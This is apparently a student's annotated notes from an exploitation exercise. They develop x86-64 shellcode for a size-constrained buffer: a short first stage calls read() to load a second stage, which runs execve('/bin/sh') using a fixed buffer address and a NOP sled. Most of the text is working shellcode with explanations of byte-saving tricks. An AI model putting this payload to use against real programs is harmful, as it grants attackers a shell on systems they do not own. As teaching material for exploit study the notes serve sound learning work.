//because we have writable addresses in the memory and we do know where these addresses are
//we'll use buffer's address directly, we'll write /bin/sh with the read
mov rdi, 0x00404070 + 26 ; //move buffer's address to rdi //first parameter of execve
mov rsi, rdi;//then we assume we have several zeroes after that
add rsi, 8;//so we move the pointer after /bin/sh
mov rdx, rsi;
mov rax, 0x3b;
syscall
/bin/sh\x00
//So how do we make it shorter ?
//the mov rdi is 8 bytes long and so is bin/sh
//our final goal is to run an execve, but it is NOT mandatory
//for it to be the first thing that we'll run
//we'll use the read(0,buffer,0x14)
//We can do ANOTHER syscall, something smaller than that is needed
//PLAN:
//1. Use the read to load up a shellcode that launches a read
//2. the read can now parse through the number of bytes in memory that WE want
//3. use the read call to launch a cozy shellcode without many
//   limitations about size
//read(stdin, buffer , 0x100)
 //mov rax,0x00 //read code, but it is too long, 7 bytes
 xor rax, rax //gets the same result of this mov rax,0x0 but with fewer bytes
 xor rdi, rdi // setting  [int fd];  mov rdi,rax is of same size
              // PLEASE REMEMBER fd = 0 is for the stdin
 //where do we read ? Ideally the new shellcode would begin right
 //where the old one left off, but then we would need to compute
 //precisely the dimension of the shellcode we have just written
 //I have 3 choices:
 //1. I precompute the size of the shellcode so I'll know how long
 //   it will be and I'll write right after it
 //2. We know it is 20 bytes so we'll build a (EXACTLY) 20 bytes
 //   first stage shellcode, after that I'll write the stage two
 //3.(EZ) Idgaf , so I overwrite everything with nops and then I'll
 //   write the shellcode
mov rsi, 0x404070 //setting [void *buf]
mov rdx, 0x100      //setting [size_t count]
syscall
//shit this is still 22 bytes long what do we do ?
//instead of rsi we'll use esi , please remember how register dimensions work

xor rax,rax
mov rdi,rax
mov esi, 0x404070
mov edx, 0x100//0x100 is only two bytes so we can switch to smaller register
              //with just dx we could have problems
syscall
// STAGE TWO
//we need to run the execve
//we can put /bin/sh @ buffer beginning
mov rax, 0x3b
mov rdi, 0x404070
mov rsi, 0x404078 //null pointer
mov rdx, rsi// pointer to zero
syscall
/*IDEA :
1st. we need a place where to put /bin/sh and the zeroes,the first 20 bytes
 are in theory not used anymore,we have like 18 bytes where to put it (??)
2nd.we need to be sure that 2nd stage is AFTER current instruction pointer
because our first stage is 18 bytes the instruction pointer will be after that
so we create a nop sled (20>18) so we're sure we are safely getting to the
instruction pointer (reach ESP w NOP sled)
*/
/*Why do we have the 8 zeroes in the stage_two ?
 for the execve we need a parameter for argv and envp, we
 do not want any, but so we cannot give zero:
 AN EMPTY LIST IS A POINTER TO NULL, it is 8 bytes of zeroes
 INSIDE buffer those 8 zeroes start @ 0x404078 !!!!
 so I'm passing an address to 8 zeroes, which is
 A NULL POINTER !!! */
